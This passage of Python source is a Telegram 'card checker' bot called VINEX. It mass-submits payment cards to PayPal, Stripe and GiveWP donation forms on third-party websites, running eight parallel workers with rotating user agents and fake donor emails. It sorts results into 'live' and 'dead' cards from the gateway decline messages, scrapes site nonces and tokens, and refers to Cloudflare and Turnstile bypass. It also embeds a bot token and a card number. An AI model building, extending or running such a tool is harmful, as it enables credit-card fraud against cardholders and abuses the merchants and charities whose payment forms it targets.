#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════════════════════
#   VINEX v23.1 — Universal Multi-Gateway + 8 Parallel Workers + Full PayPal
# ═══════════════════════════════════════════════════════════════════════════════
import telebot
from telebot import types
import telebot.apihelper
import time, threading, os, re, json, base64, random
import logging, tempfile
from string import Template
from collections import defaultdict
from urllib.parse import urlparse, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
except:
    def rand_ua(): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'

telebot.apihelper.CONNECT_TIMEOUT = 30
telebot.apihelper.READ_TIMEOUT = 180

# ═══════════ CONFIG ═══════════
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'vinex_results_{}_{}.txt'
LIVE_DIR_TMPL = 'vinex_live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
LINK_COOLDOWN = 30
PROGRESS_SAVE_EVERY = 10
STATUS_UPDATE_EVERY = 2.0
CLEANUP_OLDER_THAN_DAYS = 7
PARALLEL_WORKERS = 8

BASE_AMOUNTS = ['1.00', '3.00', '5.00']
TEST_CARD = os.getenv('TEST_CARD', '4232231186004159|01|29|903')

TS_API_URL = os.getenv('TS_API_URL', '').rstrip('/')
TS_API_KEY = os.getenv('TS_API_KEY', '')

EFFECT_FIRE = '5104841245755180586'
EFFECT_HEART = '5046509860389126442'
EFFECT_CELEBRATE = '5046589136895476101'
EFFECT_THUMBS = '5107584321108051014'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('vinex.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('vinex')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

# ═══════════ FONTS ═══════════
def _bold(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D400 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D41A + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7CE + o - 0x30))
        else: r.append(c)
    return ''.join(r)

def _sb(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D5D4 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D5EE + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7EC + o - 0x30))
        else: r.append(c)
    return ''.join(r)

B = _bold
SB = _sb

VINEX_CE = {
    'warn': ('5420323339723881652', '⚠️'), 'globe': ('5447410659077661506', '🌐'),
    'play': ('5264919878082509254', '▶️'), 'ban': ('5240241223632954241', '🚫'),
    'sound': ('5388632425314140043', '🔊'), 'party': ('6039789659691688114', '🎉'),
    'cash': ('5197434882321567830', '💵'), 'smile': ('6150116924165461974', '😊'),
    'moneybag': ('6125337376639161874', '💰'), 'laugh': ('5352615886131831104', '😆'),
    'gear': ('5929098607192969118', '⚙'), 'circle': ('5933844889652432294', '⚪'),
    'stop': ('5260293700088511294', '⛔'), 'scream': ('5222466772061436244', '😱'),
    'gift': ('6026316531967726726', '🎁'), 'record': ('6026056450223116307', '⏺'),
    'moneywings': ('5231449120635370684', '💸'), 'shop': ('5229064374403998351', '🛍'),
    'soon': ('5440621591387980068', '🔜'), 'pause': ('5359543311897998264', '⏸'),
    'shield': ('5197288647275071607', '🛡'), 'money2': ('6122682287986317242', '💸'),
    'grimace': ('6125216237086579378', '😬'), 'blue_bolt': ('5836917983271722591', '🔵'),
    'rocket': ('5836917983271722591', '🚀'),
}

def ve(name):
    if name not in VINEX_CE: return ''
    cid, fb = VINEX_CE[name]
    return f'<tg-emoji emoji-id="{cid}">{fb}</tg-emoji>'

def vt(label, value):
    return f'[⚡] {B(label)}: {value}'

def vsep():
    return '- ' * 22

def vinex_btn(label, style='primary', emoji_name=None, **kwargs):
    kw = dict(kwargs)
    if style in ('success', 'primary', 'danger'):
        kw['style'] = style
    if emoji_name and emoji_name in VINEX_CE:
        kw['icon_custom_emoji_id'] = VINEX_CE[emoji_name][0]
    try:
        return types.InlineKeyboardButton(text=label, **kw)
    except TypeError:
        kw.pop('style', None); kw.pop('icon_custom_emoji_id', None)
        return types.InlineKeyboardButton(text=label, **kw)

def playful(kind):
    pool = {'start': ['🚀','🎯','⚡','🔥'], 'working': ['⚙️','🔄','🧠','⚡','🌀'],
            'success': ['🎉','✨','💫','🎊','🏆'], 'dead': ['💀','😴','🥀','❌'],
            'live': ['💎','💚','💛','🏆'], 'error': ['⚠️','🚨','💢'],
            'fun': ['😎','🤙','👑','🦾','😏']}
    return random.choice(pool.get(kind, ['•']))

# ═══════════ STATE ═══════════
waiting_users = {}; reply_mode = {}; mass_active = {}; mass_pause = {}
user_last_paypal = defaultdict(float); user_last_mass = defaultdict(float)
link_cooldowns = {}

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w', encoding='utf-8').close()
    except: pass

def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f: f.write(f'{uid}\n')
    except: pass

def is_blocked(uid):
    try: return str(uid) in [l.strip() for l in open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines() if l.strip()]
    except: return False

def load_stats():
    try: return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except: return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(st):
    try: json.dump(st, open(STATS_FILE, 'w', encoding='utf-8'))
    except: pass

def bump_stat(k):
    try:
        s = load_stats(); s[k] = s.get(k, 0) + 1; save_stats(s)
    except: pass

def save_progress(uid, data):
    try:
        fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
        with os.fdopen(fd, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False)
        os.replace(tmp, PROGRESS_TMPL.format(uid))
    except: pass

def load_progress(uid):
    try: return json.load(open(PROGRESS_TMPL.format(uid), 'r', encoding='utf-8'))
    except: return None

def clear_progress(uid):
    try: os.remove(PROGRESS_TMPL.format(uid))
    except: pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for n in os.listdir('.'):
            if n.startswith(('vinex_results_', 'vinex_live_')):
                p = os.path.join('.', n)
                if os.path.isfile(p) and os.path.getmtime(p) < cutoff: os.remove(p)
    except: pass

_URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"': link = link[:-1]
        if len(link) < 8: return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low: return None
        if not link.startswith(('http://', 'https://')): link = 'https://' + link.lstrip('/')
        p = urlparse(link)
        if not p.netloc or not p.netloc.strip(): return None
        host = p.netloc.split(':')[0].split('@')[-1]
        if not host or not _URL_RE.match(host): return None
        return link
    except: return None

def normalize_url_key(url):
    try:
        if not url: return ''
        p = urlparse(url.lower().strip())
        host = p.netloc.replace('www.', '')
        path = p.path.rstrip('/') or '/'
        q = p.query.strip()
        return f'{host}{path}?{q}' if q else f'{host}{path}'
    except: return str(url).lower().strip()

# ═══════════ TELEGRAM HELPERS ═══════════
def retry_call(func, *args, retries=4, delays=(2,4,8,16), **kw):
    last = None
    for i in range(retries):
        try: return func(*args, **kw)
        except Exception as e:
            last = e
            if i < retries - 1: time.sleep(delays[i] if i < len(delays) else delays[-1])
    raise last

def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML', effect=None):
    for i in range(retries):
        try:
            kw = {'chat_id':cid,'text':text,'parse_mode':parse_mode,'reply_markup':reply_markup,'disable_web_page_preview':True}
            if effect:
                try: kw['message_effect_id'] = effect
                except: pass
            return bot.send_message(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w,60)); continue
            if 'effect' in err.lower() or 'unknown field' in err.lower():
                kw.pop('message_effect_id', None)
                try: return bot.send_message(**kw)
                except: pass
            if "can't parse" in err.lower() or 'bad request' in err.lower():
                try: return bot.send_message(cid, re.sub(r'<[^>]+>','',text)[:4000], reply_markup=reply_markup, disable_web_page_preview=True)
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try: return bot.edit_message_text(chat_id=cid, message_id=mid, text=text, parse_mode='HTML', disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if 'not modified' in err: return None
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w,60)); continue
            if "can't parse" in err.lower():
                try: return bot.edit_message_text(chat_id=cid, message_id=mid, text=re.sub(r'<[^>]+>','',text)[:4000])
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_send_document(cid, path, caption='', retries=3):
    try:
        if not os.path.exists(path): return None
    except: return None
    for attempt in range(3):
        try:
            with open(path, 'rb') as f:
                kw = {'chat_id':cid,'document':f,'timeout':180}
                if attempt == 0: kw['caption'] = caption; kw['parse_mode'] = 'HTML'
                elif attempt == 1: kw['caption'] = re.sub(r'<[^>]+>','',caption)[:1024]
                return bot.send_document(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w,60)); continue
            continue
    return None

def react_to(message, emoji='👍'):
    try:
        bot.set_message_reaction(chat_id=message.chat.id, message_id=message.message_id,
                                  reaction=[{'type':'emoji','emoji':emoji}], is_big=False)
        return True
    except: return False

def show_typing(cid, action='typing', duration=2.0):
    try:
        bot.send_chat_action(cid, action)
        def r():
            try:
                end = time.time() + duration
                while time.time() < end:
                    time.sleep(4)
                    if time.time() < end: bot.send_chat_action(cid, action)
            except: pass
        threading.Thread(target=r, daemon=True).start()
    except: pass

def send_dice(cid, emoji='🎲'):
    try: return bot.send_dice(cid, emoji=emoji)
    except: return None

# ═══════════ EXTRACTOR ═══════════
def extract_response_text(body):
    if not body: return ''
    s = str(body).strip()
    if not s: return ''
    try: j = json.loads(s)
    except: j = None
    def _find(obj, depth=0):
        if depth > 5 or obj is None: return None
        if isinstance(obj, str):
            if obj.strip().lower() in ('none','null','false',''): return None
            return obj[:500]
        if isinstance(obj, (int, float)): return str(obj)[:500]
        if isinstance(obj, list):
            for i in obj:
                r = _find(i, depth+1)
                if r: return r
            return None
        if isinstance(obj, dict):
            det = obj.get('details')
            if isinstance(det, list) and det:
                for x in det:
                    if isinstance(x, dict):
                        for k in ('description','issue','reason','message','error'):
                            v = x.get(k)
                            if v and str(v).strip().lower() not in ('none','null',''): return str(v)[:500]
            for k in ('description','message','error_description','error','msg','reason','detail','status','name','code','error_code','decline_code'):
                if k in obj:
                    v = obj[k]
                    if isinstance(v, dict):
                        r = _find(v, depth+1)
                        if r: return r
                    elif v and str(v).strip().lower() not in ('none','null','false',''):
                        return str(v)[:500]
            if 'data' in obj:
                r = _find(obj['data'], depth+1)
                if r: return r
            if 'errors' in obj:
                r = _find(obj['errors'], depth+1)
                if r: return r
        return None
    if j is not None:
        r = _find(j)
        if r: return r
    return s[:500]

_JUNK = ['give-','screen-reader','give-label','give-required','give-where','give_price','give-form-']
_JUNK_E = {'true','false','none','null','selected','disabled','required'}
def is_valid_option(opt):
    if not opt or not isinstance(opt, str): return False
    o = opt.strip()
    if not o: return False
    lo = o.lower()
    if lo in _JUNK_E: return False
    for p in _JUNK:
        if p in lo: return False
    if len(o) > 60 or o.startswith(('{','[','<')): return False
    return True

# ═══════════ CLASSIFIER v3 ═══════════
RETRY_ON_AUTH = ['AUTHENTICATION_FAILURE','AUTHENTICATION_FAILED','INVALID_TOKEN',
                  'TOKEN_EXPIRED','NOT_AUTHORIZED','INVALID_CLIENT','INVALID_NONCE',
                  'SESSION_EXPIRED','CSRF_TOKEN_MISMATCH']

LIVE_PENDING_KEYWORDS = [
    'PayPal orders are captured when',
    'Payer has not yet approved',
    'redirect the payer',
    'provide a valid payment_source',
    'PAYER_ACTION_REQUIRED',
    'ORDER_NOT_APPROVED',
]

CARD_DECLINES = [
    'INSTRUMENT_DECLINED','PAYER_CANNOT_PAY','ORDER_NOT_APPROVED','Payer has not yet approved',
    'Payer cannot pay','PAYMENT_DENIED','DO_NOT_HONOR','INSUFFICIENT_FUNDS','CVV_FAILURE',
    'CVV2_FAILURE','INVALID_OR_RESTRICTED','SUSPECTED_FRAUD','ACCOUNT_CLOSED','EXPIRED_CARD',
    'CARD_EXPIRED','TRANSACTION_NOT_PERMITTED','GENERIC_DECLINE','TRANSACTION_REFUSED',
    'AUTHORIZATION_DENIED','PAYER_ACCOUNT_RESTRICTED','RESTRICTED_OR_INACTIVE_ACCOUNT',
    'LOST_OR_STOLEN','PAYER_ACCOUNT_LOCKED_OR_CLOSED','ACCOUNT_BLOCKED_BY_ISSUER',
    'SECURITY_VIOLATION','COMPLIANCE_VIOLATION','CAPTURE_DECLINED','AMOUNT_MISMATCH',
    'CURRENCY_MISMATCH','POSTAL_CODE_REQUIRED','DECLINED_PLEASE_RETRY','REATTEMPT_NOT_PERMITTED',
    'TX_ATTEMPTS_EXCEED_LIMIT','PAYER_ACTION_REQUIRED','PAYEE_NOT_CONSENTED','PERMISSION_DENIED',
    'INVALID_ACCOUNT_STATUS','REFERENCED_CARD_EXPIRED','INVALID_EXPIRATION',
    'INVALID_CARD_VERIFICATION_VALUE','INVALID_TRANSACTION','DUPLICATE_TRANSACTION',
    'CARD_CLOSED','UNAUTHORIZED_USER','AVS_FAILURE','SOFT_AVS','INCORRECT_PIN_REENTER',
    'INVALID_PIN','ISSUER_NOT_AVAILABLE_NOT_RETRIABLE','ACCOUNT_NOT_ON_FILE','INVALID_ACCOUNT',
    'Your card has expired','Your card was declined',"Your card's expiration",
    "Your card's security code is incorrect","Your card number is incorrect",
    'card_expired','expired_card','card_declined','incorrect_number','incorrect_cvc',
    'invalid_number','invalid_expiry_month','invalid_expiry_year','invalid_cvc',
    'processing_error','fraudulent','lost_card','pickup_card','restricted_card',
    'revocation_of_all_authorizations','revocation_of_authorization',
    'service_not_allowed','stop_payment_order','testmode_decline',
    'withdrawal_count_limit_exceeded','authentication_required','card_velocity_exceeded',
    'expired','new_account_information_available','payment_intent_authentication_failure',
    'payment_method_unactivated','stripe_error','stripe_declined','payment_failed',
    'REJECT64','REJECT_64','REJECT-64','reject64','REJECT_42','reject_42','REJECT_05','reject_05',
    'Reject05','Reject41','Reject43','Reject51','Reject54','Reject57','Reject62','Reject65',
    'Reject75','Reject78','Reject82','Reject83','Reject85','Reject91',
    'insufficient_funds','declined_by_issuer','declined_by_gateway','transaction_declined',
    'payment_declined','charge_declined','card_rejected','payment_rejected','transaction_rejected',
    'not_permitted','not_allowed','unauthorized','declined','rejected',
    'Do Not Honor','Insufficient Funds','Expired Card','Card Declined',
    'Processor Declined','Gateway Rejected','Fraud',
    'This transaction has been declined','The credit card has expired',
    'The credit card number is invalid',
    'REJECTED','DECLINED','DENIED','REFUSED','EXPIRED','INVALID_CARD','INVALID_NUMBER',
    'INVALID_EXPIRY','INVALID_CVV','INVALID_CVC','REJECT','DECLINE','DENY','REFUSE',
    'BLOCKED','SUSPENDED','INACTIVE','CHARGEBACK','FRAUD','STOLEN','LOST',
]

CARD_LIVE_SIGNALS = ['REJECT','DECLINE','DENIED','DENY','REFUSE','INSUFFICIENT',
                     'EXPIRED','INVALID','FRAUD','STOLEN','LOST','BLOCKED',
                     'SUSPENDED','INACTIVE','CHARGEBACK','UNKNOWN_CARD',
                     'RESTRICTED','VIOLATION']

INFRA_FAILS = ['HTTP_403','HTTP_404','HTTP_500','HTTP_502','HTTP_503',
               'JSON_ERR','EXC_','NETWORK:','FETCH_FAILED','INVALID_FORM',
               'FORM_NOT_FOUND','NONCE_MISSING','FORM_ERROR','INVALID_SITE',
               'BAD_URL','INVALID_CARD_FORMAT','INVALID_EXPIRY_MONTH',
               'INVALID_CVV','INVALID_CARD_NUMBER','STRIPE_NO_PK',
               'STRIPE_PM_FAILED','STRIPE_NO_PM','STRIPE_DONATION_FAILED',
               'GATEWAY_NOT_ENABLED','CLOUDFLARE_FAIL','TURNSTILE_FAIL',
               'STRIPE_ALL_FAILED','STRIPE_NO_RESPONSE','STRIPE_TOKEN_EXC',
               'STRIPE_BLOCKED','SITE_AJAX_FAILED','SITE_AJAX_NO_RESPONSE',
               'NOT_GIVEWP','NO_GATEWAY','NO_FORM','NO_NONCE','STRIPE_NO_TOKEN',
               'STRIPE_SKIP_NO_PK','PAYFLOW_FAILED','PAYFLOW_NO_RESPONSE',
               'PP_PRO_FAILED','PP_PRO_NO_RESPONSE','PAYPAL_STANDARD_FAILED',
               'DISPATCH_NO_RESPONSE','RAW_ALL_FAILED','RAW_NO_RESPONSE']

LIVE_ZERO_FIELDS = ['response_code','responseCode','result_code','resultCode',
                    'auth_code','authCode','authorization_code','status_code',
                    'statusCode','result','status','code']

def is_card_decline(resp):
    if not resp: return False
    s = str(resp); up = s.upper()
    for p in CARD_DECLINES:
        if p.upper() in up: return True
    for sep in (':','=','|',';','/','\n','-','_'):
        if sep in s:
            for part in s.split(sep):
                pc = part.strip().upper()
                if not pc or len(pc) < 3: continue
                for p in CARD_DECLINES:
                    pu = p.upper()
                    if pc == pu: return True
                    if len(pu) > 5 and pu in pc: return True
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            def _check_zero(obj, depth=0):
                if depth > 4 or not isinstance(obj, dict): return False
                for k, v in obj.items():
                    kl = k.lower()
                    if kl in [f.lower() for f in LIVE_ZERO_FIELDS]:
                        if str(v).strip() in ('0','"0"','00','"00"','000','"000"'):
                            return True
                    if kl in ('success','error_code','errorcode','transaction_id','transactionid','txn_id','amount','total'):
                        if str(v).strip() in ('0','"0"','false','False','FALSE'):
                            return False
                    if isinstance(v, dict) and _check_zero(v, depth+1): return True
                return False
            if _check_zero(j): return True
    except: pass
    m = re.search(r'(?:reject|error|code|decline|fail)[\s_\-]*(\d{1,3})[\s:=_\-]+(.{3,150})', s, re.I)
    if m:
        reason = m.group(2).upper()
        for sig in CARD_LIVE_SIGNALS:
            if sig in reason: return True
        for p in CARD_DECLINES:
            if p.upper() in reason: return True
    card_ctx = ('CARD','PAYMENT','TRANSACTION','CHARGE','DONATE','DONATION','BILLING','AUTHORIZE','CAPTURE','GATEWAY')
    if any(x in up for x in card_ctx):
        for kw in CARD_LIVE_SIGNALS:
            if kw in up: return True
    return False

def is_live_pending(r):
    if not r: return False
    up = str(r).upper()
    for kw in LIVE_PENDING_KEYWORDS:
        if kw.upper() in up: return True
    return False

def is_infra_failure(r):
    if not r: return False
    up = str(r).upper()
    return any(p.upper() in up for p in INFRA_FAILS)

def is_auth_failure(r):
    if not r: return False
    up = str(r).upper()
    return any(k in up for k in RETRY_ON_AUTH)

def is_live_response(r):
    if not r: return False
    up = str(r).upper()
    if 'CHARGE' in up: return True
    if is_card_decline(up): return True
    if is_live_pending(up): return True
    if is_infra_failure(up): return False
    if is_auth_failure(up): return False
    return False

def is_dead_response(r):
    if not r: return True
    up = str(r).upper()
    if 'CHARGE' in up: return False
    if is_card_decline(up): return False
    if is_live_pending(up): return False
    return is_infra_failure(up) or is_auth_failure(up)

PRIORITY = [
    ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195), ('INVALID_OR_RESTRICTED_CARD', 190),
    ('TRANSACTION_NOT_PERMITTED', 188), ('PAYER_CANNOT_PAY', 185),
    ('ORDER_NOT_APPROVED', 185), ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
    ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170), ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164), ('REATTEMPT_NOT_PERMITTED', 160),
    ('ACCOUNT_BLOCKED_BY_ISSUER', 158), ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153),
    ('CAPTURE_DECLINED', 145), ('AUTHORIZATION_DENIED', 143), ('DECLINED', 100),
]

def score_result(r):
    if not r: return 0
    up = str(r).upper()
    for k, s in PRIORITY:
        if k.upper() in up: return s
    return 1

def normalize_result(r):
    if not r: return 'DECLINED'
    s = str(r); up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    raw = extract_response_text(s) or s
    return raw[:300]

# ═══════════ DECODER ENGINE ═══════════
class DecoderEngine:
    @staticmethod
    def b64(s):
        try: return base64.b64decode(s + '=' * (-len(s) % 4)).decode('utf-8', errors='ignore')
        except: return None
    @staticmethod
    def b64_url(s):
        try: return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)).decode('utf-8', errors='ignore')
        except: return None
    @staticmethod
    def b32(s):
        try: return base64.b32decode(s + '=' * (-len(s) % 8)).decode('utf-8', errors='ignore')
        except: return None
    @staticmethod
    def hex_dec(s):
        try:
            cl = re.sub(r'[^0-9a-fA-F]', '', s)
            if len(cl) % 2 != 0 or len(cl) < 10: return None
            return bytes.fromhex(cl).decode('utf-8', errors='ignore')
        except: return None
    @staticmethod
    def url_dec(s):
        try:
            if '%' in s: return unquote(s)
        except: pass
        return None
    @staticmethod
    def html_ent(s):
        try:
            import html
            if '&' in s and ';' in s: return html.unescape(s)
        except: pass
        return None
    @staticmethod
    def rot13(s):
        try:
            import codecs
            return codecs.decode(s, 'rot_13')
        except: return None
    @staticmethod
    def reverse(s): return s[::-1]
    @staticmethod
    def jwt_payload(s):
        try:
            if not s.startswith('eyJ') or s.count('.') != 2: return None
            parts = s.split('.')
            p = parts[1] + '=' * (-len(parts[1]) % 4)
            return base64.urlsafe_b64decode(p).decode('utf-8', errors='ignore')
        except: return None
    @classmethod
    def decode_chain(cls, s, max_depth=3):
        results = [s]; frontier = [s]
        for _ in range(max_depth):
            new_f = []
            for item in frontier:
                for m in [cls.b64, cls.b64_url, cls.b32, cls.hex_dec, cls.url_dec,
                          cls.html_ent, cls.rot13, cls.reverse]:
                    try:
                        r = m(item)
                        if r and r != item and len(r) > 8 and r not in results:
                            results.append(r); new_f.append(r)
                    except: continue
            if not new_f: break
            frontier = new_f[:20]
        return results

# ═══════════ EXTRACTOR ENGINE ═══════════
class ExtractorEngine:
    @staticmethod
    def from_comments(h): return [m.group(1) for m in re.finditer(r'<!--(.*?)-->', h, re.DOTALL)]
    @staticmethod
    def from_data(h): return [m.group(1) for m in re.finditer(r'data-[\w-]+=["\']([^"\']{20,})["\']', h, re.I)]
    @staticmethod
    def from_json_scripts(h):
        return [m.group(1) for m in re.finditer(r'<script[^>]*type=["\']application/(?:ld\+)?json["\'][^>]*>(.*?)</script>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_js(h):
        return [m.group(1) for m in re.finditer(r'<script(?![^>]*\bsrc=)[^>]*>(.*?)</script>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_meta(h): return [m.group(1) for m in re.finditer(r'<meta[^>]+content=["\']([^"\']{20,})["\']', h, re.I)]
    @staticmethod
    def from_onclick(h): return [m.group(1) for m in re.finditer(r'on\w+=["\']([^"\']{20,})["\']', h, re.I)]
    @staticmethod
    def from_class(h):
        out = []
        for m in re.finditer(r'class=["\']([^"\']+)["\']', h, re.I):
            for w in m.group(1).split():
                if len(w) > 40 and re.match(r'^[A-Za-z0-9+/=_-]+$', w): out.append(w)
        return out
    @staticmethod
    def from_style(h): return [m.group(1) for m in re.finditer(r'url\(["\']?([^"\')]+)["\']?\)', h, re.I)]
    @staticmethod
    def from_wp(h):
        out = []
        for pat in [r'window\.wp\w+\s*=\s*(\{.*?\});', r'wpApiSettings\s*=\s*(\{.*?\});',
                    r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_ajax(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-admin/admin-ajax\.php)["\']', h, re.I)]
    @staticmethod
    def from_rest(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-json/[^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_next(h):
        m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_initial(h):
        out = []
        for pat in [r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});', r'window\.__PRELOADED_STATE__\s*=\s*(\{.*?\});']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_b64(h): return [m.group(1) for m in re.finditer(r'["\']([A-Za-z0-9+/]{60,}={0,2})["\']', h)]
    @staticmethod
    def from_hex(h): return [m.group(1) for m in re.finditer(r'["\']([0-9a-fA-F]{60,})["\']', h)]

    @classmethod
    def extract_all(cls, h):
        seen = set(); out = []
        passes = [('comment', cls.from_comments), ('data', cls.from_data), ('json', cls.from_json_scripts),
                  ('js', cls.from_js), ('meta', cls.from_meta), ('onclick', cls.from_onclick),
                  ('class', cls.from_class), ('style', cls.from_style), ('wp', cls.from_wp),
                  ('ajax', cls.from_ajax), ('rest', cls.from_rest), ('next', cls.from_next),
                  ('initial', cls.from_initial), ('b64', cls.from_b64), ('hex', cls.from_hex)]
        for name, fn in passes:
            try:
                for chunk in fn(h):
                    if not chunk or len(chunk) < 10: continue
                    key = chunk[:200]
                    if key in seen: continue
                    seen.add(key)
                    out.append({'source': name, 'content': chunk})
            except: continue
        return out

# ═══════════ VINEX TESTER v23.1 ═══════════
FIRST_NAMES = ['James','John','Robert','Michael','William','David']
LAST_NAMES = ['Smith','Johnson','Williams','Brown','Jones','Miller']

class VinexTester:
    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query: self.inurl += '?' + p.query
        except: self.url = 'invalid.local'; self.inurl = '/'

        self.paypal = None; self.client_id = None
        self.donation = '1.00'; self.minimum = '5.00'; self.currency = 'USD'
        self.price_levels = []; self.id_form1 = None; self.id_form2 = None
        self.nonce = None; self.wp_nonce = None; self.au = None
        self.ajax_url = None; self.current_price_id = None
        self.page_html = ''; self.all_content = ''
        self.auth_method = 'none'; self.gateway_type = 'unknown'
        self.form_fields = {}
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100,999)}@gmail.com'
        self.r = requests.Session(); self.r.verify = True
        self.r.headers.update({'user-agent': rand_ua(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'})
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False
        self._baked = False
        self.cf_detected = False
        self.cf_sitekey = None
        self.cf_solved = False
        self.stripe_pk = None
        self.actual_payment_mode = None
        self.enabled_modes = []
        self.has_stripe = False
        self.has_paypal_commerce = False
        self.has_braintree = False
        self.has_paypal_sdk = False
        self.all_card_modes = []
        self.has_card_fields = False
        self.card_field_names = {}
        self.stripe_blocked = False
        self.is_givewp = False
        self.paypal_modes = []
        # ✅ v23.1
        self.response_gateway = None
        self._current_gateway_name = None

    def _log(self, m):
        try: self.diagnostics.append(f'{time.time():.2f} {m}')
        except: pass

    def _safe_get(self, url, timeout=15, headers=None):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            if '://none' in url.lower(): return None
            return self.r.get(url, timeout=timeout, headers=headers or {})
        except: return None

    def _safe_post(self, url, **kw):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            return self.r.post(url, timeout=kw.pop('timeout', 20), **kw)
        except: return None

    def _build_url(self, base, path):
        try:
            if not base or not path: return None
            if path.startswith('//'): return 'https:' + path
            if path.startswith('/'): return f'https://{base}{path}'
            if not path.startswith('http'): return f'https://{base}/{path}'
            return path
        except: return None

    def _get_browser_headers(self, extra=None, ajax=True):
        headers = {
            'User-Agent': self.uu.random,
            'Accept': 'application/json, text/plain, */*' if ajax else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
